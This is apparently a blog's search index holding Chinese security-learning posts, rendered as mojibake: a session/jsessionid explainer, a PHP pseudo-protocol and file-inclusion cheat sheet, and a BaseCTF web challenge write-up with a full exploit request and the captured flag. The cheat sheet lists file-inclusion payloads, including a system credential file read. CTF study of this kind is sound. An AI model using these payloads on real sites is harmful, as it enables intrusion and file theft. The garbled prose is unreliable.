<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2020-9484-tomcat-sessionæŒä¹…åŒ–</title>
    <link href="/2024/09/16/CVE-2020-9484-tomcat-session%E6%8C%81%E4%B9%85%E5%8C%96/"/>
    <url>/2024/09/16/CVE-2020-9484-tomcat-session%E6%8C%81%E4%B9%85%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.secpulse.com/archives/163637.html">CVE</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jsessionidæ˜¯ä»€ä¹ˆï¼Ÿ</title>
    <link href="/2024/09/16/jsessionid%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
    <url>/2024/09/16/jsessionid%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰ä¸æ˜¯å†™äº†ä¸€ä¸ªçˆ¬æ•°æ®çš„è„šæœ¬ä¹ˆï¼Œä»Šå¤©å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯jsessonidåœ¨åˆ·æ–°ä¹‹åå˜äº†ï¼Œæ‰€ä»¥æˆ‘ç°åœ¨æƒ³è¦æ‰¾åˆ°ä¸€ä¸ªä¸ä¼šå˜çš„æ–¹æ³•ï¼Œä¸è¿‡è¿™ä¸ªä¿®æ”¹å’Œå­¦ä¹ æ—¶é—´åº”è¯¥ä¼šå˜å¾—æ¯”è¾ƒä¹…ï¼Œæ„Ÿè§‰æŒºé«˜é˜¶çš„</p><p>çœ‹äº†ä¸€äº›æ–‡ç« å°†çš„éƒ½æ˜¯tomcatçš„çš„ä¾‹å­ï¼Œå…ˆè®²è®²ä»€ä¹ˆæ˜¯sessionï¼Œæµè§ˆå™¨ç¬¬ä¸€æ¬¡è®¿é—®æœåŠ¡å™¨ä¼šç”Ÿæˆä¸€ä¸ªsessionä¿å­˜ç›¸å…³ä¿¡æ¯ï¼Œä¼šæœ‰ä¸€ä¸ªsessionidæ¥å¯¹åº”è¿™ä¸ªsessionï¼Œ<strong>é‚£ä¹ˆæˆ‘ä»¬å°±æƒ³å¯ä¸å¯ä»¥åˆ©ç”¨è¿™ä¸ªidç›´æ¥å»æŸ¥sessionçš„å€¼</strong>  </p><p>tomcatçš„StandardManagerç±»å°†sessionå­˜å‚¨åœ¨å†…å­˜ä¸­ä¹Ÿå¯ä»¥æŒä¹…åŒ–åˆ°æ–‡ä»¶ä¸­ï¼Œsessionidæ˜¯ä¸€ä¸ªæŒ‡ä»£sessionåœ¨æœåŠ¡å™¨ç«¯ä½ç½®çš„å€¼ï¼Œå­˜å‚¨åœ¨å®¢æˆ·ç«¯çš„cookieä¸Šï¼Œä¸ä¼šå°†sessionä¿å­˜åœ¨æœ¬åœ°,sessionä¹Ÿåªèƒ½é€šè¿‡invalidateæˆ–è¶…æ—¶æ¥é”€æ¯</p><blockquote><p>é‚£ä¹ˆSessionåœ¨ä½•æ—¶åˆ›å»ºå‘¢ï¼Ÿå½“ç„¶è¿˜æ˜¯åœ¨æœåŠ¡å™¨ç«¯ç¨‹åºè¿è¡Œçš„è¿‡ç¨‹ä¸­åˆ›å»ºçš„ï¼Œä¸åŒè¯­è¨€å®ç°çš„åº”ç”¨ç¨‹åºæœ‰ä¸åŒåˆ›å»ºSessionçš„æ–¹æ³•ï¼Œè€Œåœ¨Javaä¸­æ˜¯é€šè¿‡è°ƒç”¨HttpServletRequestçš„getSessionæ–¹æ³•ï¼ˆä½¿ç”¨trueä½œä¸ºå‚æ•°ï¼‰åˆ›å»ºçš„ã€‚åœ¨åˆ›å»ºäº†Sessionçš„åŒæ—¶ï¼ŒæœåŠ¡å™¨ä¼šä¸ºè¯¥Sessionç”Ÿæˆå”¯ä¸€çš„Session idï¼Œè€Œè¿™ä¸ªSession idåœ¨éšåçš„è¯·æ±‚ä¸­ä¼šè¢«ç”¨æ¥é‡æ–°è·å¾—å·²ç»åˆ›å»ºçš„Sessionï¼›åœ¨Sessionè¢«åˆ›å»ºä¹‹åï¼Œå°±å¯ä»¥è°ƒç”¨Sessionç›¸å…³çš„æ–¹æ³•å¾€Sessionä¸­å¢åŠ å†…å®¹äº†ï¼Œè€Œè¿™äº›å†…å®¹åªä¼šä¿å­˜åœ¨æœåŠ¡å™¨ä¸­ï¼Œå‘åˆ°å®¢æˆ·ç«¯çš„åªæœ‰Session idï¼›å½“å®¢æˆ·ç«¯å†æ¬¡å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¼šå°†è¿™ä¸ªSession idå¸¦ä¸Šï¼ŒæœåŠ¡å™¨æ¥å—åˆ°è¯·æ±‚ä¹‹åå°±ä¼šä¾æ®Session idæ‰¾åˆ°ç›¸åº”çš„Sessionï¼Œä»è€Œå†æ¬¡ä½¿ç”¨ä¹‹ã€‚</p></blockquote><p>åˆ›å»ºï¼šsessionidç¬¬ä¸€æ¬¡äº§ç”Ÿæ˜¯åœ¨ç›´åˆ°æŸserverç«¯ç¨‹åºè°ƒç”¨ HttpServletRequest.getSession(true)è¿™æ ·çš„è¯­å¥æ—¶æ‰è¢«åˆ›å»ºã€‚</p><p>åˆ é™¤ï¼šè¶…æ—¶ï¼›ç¨‹åºè°ƒç”¨HttpSession.invalidate()ï¼›ç¨‹åºå…³é—­ï¼›</p><p>sessionå­˜æ”¾åœ¨å“ªé‡Œï¼šæœåŠ¡å™¨ç«¯çš„å†…å­˜ä¸­ã€‚ä¸è¿‡sessionå¯ä»¥é€šè¿‡ç‰¹æ®Šçš„æ–¹å¼åšæŒä¹…åŒ–ç®¡ç†ï¼ˆmemcacheï¼Œredisï¼‰ã€‚</p><p>sessionçš„idæ˜¯ä»å“ªé‡Œæ¥çš„ï¼ŒsessionIDæ˜¯å¦‚ä½•ä½¿ç”¨çš„ï¼šå½“å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡è¯·æ±‚sessionå¯¹è±¡æ—¶å€™ï¼ŒæœåŠ¡å™¨ä¼šä¸ºå®¢æˆ·ç«¯åˆ›å»ºä¸€ä¸ªsessionï¼Œå¹¶å°†é€šè¿‡ç‰¹æ®Šç®—æ³•ç®—å‡ºä¸€ä¸ªsessionçš„IDï¼Œç”¨æ¥æ ‡è¯†è¯¥sessionå¯¹è±¡</p><p>sessionä¼šå› ä¸ºæµè§ˆå™¨çš„å…³é—­è€Œåˆ é™¤å—ï¼Ÿ<br>ä¸ä¼šï¼Œsessionåªä¼šé€šè¿‡ä¸Šé¢æåˆ°çš„æ–¹å¼å»å…³é—­ã€‚</p><p>ä¸‹é¢æ˜¯tomcatä¸­sessionçš„åˆ›å»ºï¼š</p><blockquote><p>ManagerBaseæ˜¯æ‰€æœ‰sessionç®¡ç†å·¥å…·ç±»çš„åŸºç±»ï¼Œå®ƒæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ‰€æœ‰å…·ä½“å®ç°sessionç®¡ç†åŠŸèƒ½çš„ç±»éƒ½è¦ç»§æ‰¿è¿™ä¸ªç±»ï¼Œè¯¥ç±»æœ‰ä¸€ä¸ªå—ä¿æŠ¤çš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å°±æ˜¯åˆ›å»ºsessionIdå€¼çš„æ–¹æ³•ï¼š<br>ï¼ˆ tomcatçš„sessionçš„idå€¼ç”Ÿæˆçš„æœºåˆ¶æ˜¯ä¸€ä¸ªéšæœºæ•°åŠ æ—¶é—´åŠ ä¸Šjvmçš„idå€¼ï¼Œjvmçš„idå€¼ä¼šæ ¹æ®æœåŠ¡å™¨çš„ç¡¬ä»¶ä¿¡æ¯è®¡ç®—å¾—æ¥ï¼Œå› æ­¤ä¸åŒjvmçš„idå€¼éƒ½æ˜¯å”¯ä¸€çš„ï¼‰ï¼Œ<br>StandardManagerç±»æ˜¯tomcatå®¹å™¨é‡Œé»˜è®¤çš„sessionç®¡ç†å®ç°ç±»ï¼Œ<br>å®ƒä¼šå°†sessionçš„ä¿¡æ¯å­˜å‚¨åˆ°webå®¹å™¨æ‰€åœ¨æœåŠ¡å™¨çš„å†…å­˜é‡Œã€‚<br>PersistentManagerBaseä¹Ÿæ˜¯ç»§æ‰¿ManagerBaseç±»ï¼Œå®ƒæ˜¯æ‰€æœ‰æŒä¹…åŒ–å­˜å‚¨sessionä¿¡æ¯çš„åŸºç±»ï¼ŒPersistentManagerç»§æ‰¿äº†PersistentManagerBaseï¼Œä½†æ˜¯è¿™ä¸ªç±»åªæ˜¯å¤šäº†ä¸€ä¸ªé™æ€å˜é‡å’Œä¸€ä¸ªgetNameæ–¹æ³•ï¼Œç›®å‰çœ‹æ¥æ„ä¹‰ä¸å¤§ï¼Œ å¯¹äºæŒä¹…åŒ–å­˜å‚¨sessionï¼Œtomcatè¿˜æä¾›äº†StoreBaseçš„æŠ½è±¡ç±»ï¼Œå®ƒæ˜¯æ‰€æœ‰æŒä¹…åŒ–å­˜å‚¨sessionçš„åŸºç±»ï¼Œå¦å¤–tomcatè¿˜ç»™å‡ºäº†æ–‡ä»¶å­˜å‚¨FileStoreå’Œæ•°æ®å­˜å‚¨JDBCStoreä¸¤ä¸ªå®ç°ã€‚</p></blockquote><p>æ‰€ä»¥ä¼šå‡ºç°ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š</p><blockquote><p>1ã€serveræ²¡æœ‰å…³é—­ï¼Œå¹¶åœ¨sessionå¯¹è±¡é”€æ¯æ—¶é—´å†…ï¼Œå½“å®¢æˆ·ç«¯å†æ¬¡æ¥è¯·æ±‚serveç«¯çš„servletæˆ–jspæ—¶ï¼Œå°†ä¼šæŠŠå°†ç¬¬ä¸€æ¬¡è¯·æ±‚è¯¥serveæ—¶ç”Ÿæˆçš„sessionidå¸¦åˆ°è¯·æ±‚å¤´ä¸Šå‘serverç«¯å‘é€ï¼Œserverç«¯æ”¶åˆ°sessionidåæ ¹æ®æ­¤sessionidä¼šå»æœç´¢serverå¯¹åº”çš„sessionå¯¹è±¡å¹¶ç›´æ¥è¿”å›è¿™ä¸ªsessionå¯¹è±¡ï¼Œæ­¤æ—¶ä¸ä¼šé‡æ–°åˆ›å»ºsessionå¯¹è±¡ã€‚<br>2ã€å½“serverå…³é—­ï¼ˆä¹‹å‰äº§ç”Ÿçš„sessionå¯¹è±¡ä¹Ÿå°±æ¶ˆäº¡äº†ï¼‰ï¼Œæˆ–è€…sessionå¯¹è±¡è¿‡äº†é”€æ¯æ—¶é—´ï¼Œæµè§ˆå™¨çª—å£æ²¡æœ‰å…³é—­ï¼Œå¹¶åœ¨æœ¬çª—å£ç»§ç»­è¯·æ±‚serverç«¯çš„servletæˆ–è€…jspæ—¶ï¼Œæ­¤æ—¶åŒæ ·ä¼šå°†sessionid å‘é€åˆ° æœåŠ¡ç«¯ï¼Œserveræ‹¿ç€idå»æ‰¾å¯¹åº”çš„sessionå¯¹è±¡ï¼›ä½†æ˜¯æ­¤æ—¶sessionå¯¹è±¡å·²ç»ä¸å­˜åœ¨äº†ã€‚æ‰€ä»¥ä¼šé‡æ–°ç”Ÿæˆä¸€ä¸ªsessionå’Œå¯¹åº”çš„sessionid ï¼Œå°†è¿™ä¸ªæ–°çš„idä»¥å“åº”æŠ¥æ–‡çš„å½¢å¼å‘åˆ°æµè§ˆå™¨çš„å†…æ ¸ä¸­ï¼Œé‡æ–°æ›´æ–°cookieã€‚<br>3ã€å½“serveræ²¡æœ‰å…³é—­ï¼Œå¹¶ä¸”sessionå¯¹è±¡åœ¨å…¶é”€æ¯æ—¶é—´å†…ï¼Œå½“è¯·æ±‚ä¸€ä¸ªjspé¡µé¢è¿”å›å®¢æˆ·ç«¯åï¼Œå…³é—­æ­¤æµè§ˆå™¨çª—å£ï¼Œæ­¤æ—¶å…¶å†…å­˜ä¸­çš„sessionidä¹Ÿå°±éšä¹‹é”€æ¯ã€‚åœ¨é‡æ–°å»è¯·æ±‚serverç«¯çš„servletæˆ–è€…jspæ—¶ï¼Œä¼šé‡æ–°ç”Ÿæˆä¸€ä¸ªsessionidç»™å®¢æˆ·ç«¯æµè§ˆå™¨ï¼Œå¹¶ä¸”å­˜åœ¨æµè§ˆå™¨å†…å­˜ä¸­ã€‚</p></blockquote><p>æˆ‘ä»¬ä½¿ç”¨çš„å…¶å®å°±æ˜¯å°†å·²ç»å­˜æ”¾çš„cookieæ¥é‡æ”¾è·å–å¯¹åº”çš„æ•°æ®ï¼Œä¸è¿‡åœ¨åˆ·æ–°è¿‡ååº”è¯¥ä¼šè°ƒç”¨HttpSession.invalidate()ï¼Œå¹¶åœ¨ä¸‹æ¬¡è¯·æ±‚æ—¶åˆ›å»ºä¸€ä¸ªæ–°çš„sessionæ¥è¿›è¡Œè®¿é—®ï¼Œæ‰€ä»¥è¦æ˜¯æƒ³æ”¹çš„çš„è¯è¦ä¹ˆå°±æ˜¯å¯¹åº”çš„æœåŠ¡å™¨ç«¯æœ‰sessionæŒç»­åŒ–ä¿å­˜æœºåˆ¶ï¼Œä¸ç„¶æˆ‘æ¯éš”ä¸¤å¤©å°±è¦æ‰‹åŠ¨æ›´æ–°sessionéš¾å—å“¦ï¼Œ&#x2F;(ã„’oã„’)&#x2F;~~</p><p><strong>cookieçš„ä¿å­˜æ–¹å¼æœ‰ä¸¤ç§ï¼š</strong><br>å¦‚æœæ²¡æœ‰è®¾ç½®cookieçš„å¤±æ•ˆæ—¶é—´ï¼Œè¿™ä¸ªcookieå°±å­˜åœ¨ä¸æµè§ˆå™¨è¿›ç¨‹ï¼›</p><p>è®¾ç½®äº†cookieçš„å¤±æ•ˆæ—¶é—´ï¼Œé‚£ä¹ˆè¿™ä¸ªcookieå°±å­˜åœ¨äºç¡¬ç›˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Cookieçš„ä¸€äº›åŸºæœ¬è®¾ç½®</span><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;Admin-Token&quot;</span>, token);<br><br>        Cookie[] cookie2 = request.getCookies();<br>        <span class="hljs-comment">//request.getContextPath()   mdrwebrest</span><br>        cookie.setPath(<span class="hljs-string">&quot;/&quot;</span>);        <span class="hljs-comment">//è®¾ç½®cookiesæœ‰æ•ˆè·¯å¾„</span><br>        <span class="hljs-comment">//è®¾ç½®cookieæœ‰æ•ˆæ—¶é—´  æ­£æ•°ï¼šå­˜åˆ°ç¡¬ç›˜ï¼Œè´Ÿæ•°å­˜åˆ°æµè§ˆå™¨ï¼Œ0ç«‹åˆ»é”€æ¯</span><br>        cookie.setMaxAge();      <br>        cookie.setDomain(loginToMDRConfig.getIP()); <span class="hljs-comment">//è·¨åŸŸ</span><br>        response.addCookie(cookie);<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯å®ç°æœºåˆ¶å›¾<br><img src="https://gitee.com/fogpost/photo/raw/master/202409161116311.png" srcset="/img/loading.gif" lazyload><br>æ–‡ç« ç»™å‡ºçš„è·å–sessionidæ–¹æ³•æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">HttpSession session=request.getSession(); <span class="hljs-comment">//è·å–session</span><br>String sessionid=session.getId();  <span class="hljs-comment">//è·å–sessionid</span><br>Cookie cookie=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;JSESSIONID&quot;</span>,sessionid); <span class="hljs-comment">//æ‰‹åŠ¨è®¾ç½®ä¸€ä¸ªç¡¬ç›˜å­˜å‚¨COOKIEï¼Œè¿™ä¸ªcooikeæ—¶å­˜åœ¨ç¡¬ç›˜çš„ï¼Œä¸æ˜¯å­˜åœ¨æµè§ˆå™¨çº¿ç¨‹çš„</span><br>cookie.setMaxAge(<span class="hljs-number">30</span>*<span class="hljs-number">60</span>);<br>response.addCookie(cookie); <span class="hljs-comment">//å°†COOKIEè®¾ç½®åˆ°å“åº”ä¸Š</span><br></code></pre></td></tr></table></figure><p>å…¶å®æˆ‘ä»¬å¯ä»¥å‡å€ŸæœåŠ¡å™¨è‡ªå·±çš„æ‰‹ï¼Œé€šè¿‡burpæŠ“åŒ…æ¥å®ç°è·å–å¯¹åº”çš„sessionidï¼Œè¿›ä¸€æ­¥è·å–å¯¹åº”æŠ¥æ–‡(è¿™ä¸å°±æ˜¯æˆ‘ä¹‹å‰å¹²è¿‡çš„ä¹ˆï¼Œç°åœ¨å­¦äº†ä¸€éåŸç†ï¼ŒğŸ‘¿æˆ‘äº†)</p><p><a href="https://www.cnblogs.com/Timeouting-Study/p/16082575.html">jsessionid</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>session</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2024/09/16/SSRF/"/>
    <url>/2024/09/16/SSRF/</url>
    
    <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/article/2288231">web</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¼ªåè®®ä¸æ–‡ä»¶åŒ…å«</title>
    <link href="/2024/09/16/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2024/09/16/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h3 id="å‰ç½®å­¦ä¹ è¦æ±‚"><a href="#å‰ç½®å­¦ä¹ è¦æ±‚" class="headerlink" title="å‰ç½®å­¦ä¹ è¦æ±‚"></a>å‰ç½®å­¦ä¹ è¦æ±‚</h3><h4 id="æ–‡ä»¶åŒ…å«å‡½æ•°"><a href="#æ–‡ä»¶åŒ…å«å‡½æ•°" class="headerlink" title="æ–‡ä»¶åŒ…å«å‡½æ•°"></a>æ–‡ä»¶åŒ…å«å‡½æ•°</h4><blockquote><p>æ–‡ä»¶åŒ…å«æ‰€å¯èƒ½æœ‰çš„å‡½æ•°<br>phpå½“ä¸­ä¼šé€ æˆæ–‡ä»¶åŒ…å«æ¼æ´çš„å‡½æ•°æœ‰ï¼šincludeã€requireã€include_onceã€require_onceã€highlight_file ã€show_source ã€readfile ã€file_get_contents ã€fopen ã€file<br>å®ç°æ–¹æ³•</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span> ?file=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#GETæ•°æ®</span><br><span class="hljs-number">2</span> ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=  <span class="hljs-comment">#åé¢çš„base64å­—ç¬¦æ˜¯éœ€è¦ä¼ å…¥çš„å­—ç¬¦ä¸²çš„base64ç¼–ç </span><br><span class="hljs-number">3</span> ?file=php:<span class="hljs-comment">//input [POST DATA:]&lt;?php phpinfo()?&gt;  #POSTæ•°æ®</span><br><span class="hljs-number">4</span> ?file=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=xxx.php  #getè¯»æºç </span><br></code></pre></td></tr></table></figure><h4 id="phpä¼ªåè®®"><a href="#phpä¼ªåè®®" class="headerlink" title="phpä¼ªåè®®"></a>phpä¼ªåè®®</h4><blockquote><p>éœ€è¦å¼€å¯allow_url_fopençš„ï¼šphp:&#x2F;&#x2F;inputã€php:&#x2F;&#x2F;stdinã€php:&#x2F;&#x2F;memoryå’Œphp:&#x2F;&#x2F;temp<br>ä¸éœ€è¦å¼€å¯allow_wrl_fopençš„ï¼šphp:&#x2F;&#x2F;filter<br>åœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯php:&#x2F;&#x2F;filterå’Œphp:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;filterç”¨äºè¯»å–æºç ï¼Œphp:&#x2F;&#x2F;inputç”¨äºæ‰§è¡Œphpä»£ç <br>php:&#x2F;&#x2F;inputéœ€è¦postè¯·æ±‚æäº¤æ•°æ®<br>php:&#x2F;&#x2F;filterå¯ä»¥getæäº¤?a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p></blockquote><h4 id="dataä¼ªåè®®"><a href="#dataä¼ªåè®®" class="headerlink" title="dataä¼ªåè®®"></a>dataä¼ªåè®®</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?xxx=data:<span class="hljs-comment">//text/plain;base64,æƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼çš„base64ç¼–ç </span><br>?file=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h4 id="fileåè®®"><a href="#fileåè®®" class="headerlink" title="fileåè®®"></a>fileåè®®</h4><blockquote><p>File:&#x2F;&#x2F; è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ<br>file:&#x2F;&#x2F; ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œå¦‚c:ç›˜ä¸­çš„ä¸œè¥¿ã€‚åœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“ã€‚<br>file:&#x2F;&#x2F; [æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]<br>linux ç³»ç»Ÿç¯å¢ƒä¸‹ï¼š?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>winows ç³»ç»Ÿç¯å¢ƒä¸‹ï¼š?file&#x3D;file:&#x2F;&#x2F;&#x2F;E:\phpStudy\WWW\code\phpinfo.php</p></blockquote><p>æ€»ç»“ï¼šFileåè®®ç”¨äºè¯»å–ç³»ç»Ÿæ–‡ä»¶ï¼Œcç›˜å…³é”®å†…å®¹ã€‚Php:&#x2F;&#x2F;filter ç”¨æ¥è¯»å–æ–‡ä»¶å†…å®¹ï¼Œä½†æ˜¯è¦base64åå‡ºæ¥ï¼Œå¦åˆ™ä¼šé€ æˆæ–‡ä»¶æ‰§è¡Œä»è€Œåªçœ‹åˆ°æ‰§è¡Œç»“æœã€‚Php:&#x2F;&#x2F;inputï¼ˆä»£ç æ‰§è¡Œï¼‰å¯å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚å¯ä»¥ç”¨äºå†™æœ¨é©¬ã€‚Dataå’Œinputç›¸ä¼¼ï¼Œå¯ä»¥ä»£ç æ‰§è¡Œï¼Œä½†åªæœ‰åœ¨php&lt;5.3ä¸”include&#x3D;onæ—¶å¯ä»¥å†™æœ¨é©¬ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Basectfweb</title>
    <link href="/2024/09/15/Basectfweb/"/>
    <url>/2024/09/15/Basectfweb/</url>
    
    <content type="html"><![CDATA[<p>webåˆå­¦è€…å°å†™å‡ ä¸ªwebé¢˜</p><h4 id="Aura-é…±çš„ç¤¼ç‰©"><a href="#Aura-é…±çš„ç¤¼ç‰©" class="headerlink" title="Aura é…±çš„ç¤¼ç‰©"></a>Aura é…±çš„ç¤¼ç‰©</h4><p>å¼€å¯é¡µé¢æŸ¥çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Aura é…±ï¼Œæ¬¢è¿å›å®¶~</span><br><span class="hljs-comment">// è¿™é‡Œæœ‰ä¸€ä»½ç¤¼ç‰©ï¼Œè¯·ä½ ç­¾æ”¶ä¸€ä¸‹å“Ÿ~</span><br><span class="hljs-variable">$pen</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pen&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$pen</span>) !== <span class="hljs-string">&#x27;Aura&#x27;</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;è¿™æ˜¯ Aura çš„ç¤¼ç‰©ï¼Œä½ ä¸æ˜¯ Auraï¼&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ç¤¼ç‰©æ”¶åˆ°å•¦ï¼Œæ¥ä¸‹æ¥è¦å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~</span><br><span class="hljs-variable">$challenge</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;challenge&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$challenge</span>, <span class="hljs-string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;è¿™ä¸æ˜¯ Aura çš„åšå®¢ï¼&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$blog_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$challenge</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$blog_content</span>, <span class="hljs-string">&#x27;å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦&#x27;</span>) === <span class="hljs-literal">false</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;è¯·å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// å˜¿å˜¿ï¼Œæ¥ä¸‹æ¥è¦æ‹†å¼€ç¤¼ç‰©å•¦ï¼Œæ‚„æ‚„å‘Šè¯‰ä½ ï¼Œç¤¼ç‰©åœ¨ flag.php é‡Œé¢å“¦~</span><br><span class="hljs-variable">$gift</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gift&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$gift</span>);<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œäº†è§£è¯»å–æ–‡ä»¶åçš„å†…å®¹æ˜¯Auraå°è¯•data:&#x2F;&#x2F;ä¸ºåè®®æ¥è¯»å–<br>ç¬¬äºŒä¸ªåˆ¤æ–­åˆ©ç”¨äº†@çš„ssrfç»•è¿‡<br>ç¬¬ä¸‰ä¸ªé‡‡ç”¨äº†phpä¼ªåè®®çš„æ•°æ®ä¼ è¾“</p><pre><code class="hljs">POST / HTTP/1.1Host: challenge.basectf.fun:36145Cache-Control: max-age=0Accept-Language: zh-CNUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Length: 138Content-Type: application/x-www-form-urlencodedpen=data://text/plain,Aura&amp;challenge=http://jasmineaura.github.io@127.0.0.1&amp;gift=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p>&lt;?php &#x2F;&#x2F; BaseCTF{81918213-ed45-40b9-b751-99e831a0bc75}  Aura é…±æœ‰æ‹¿åˆ°ä¸€è¡€å—ï¼Ÿ</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pythonticke</title>
    <link href="/2024/09/15/pythonticke/"/>
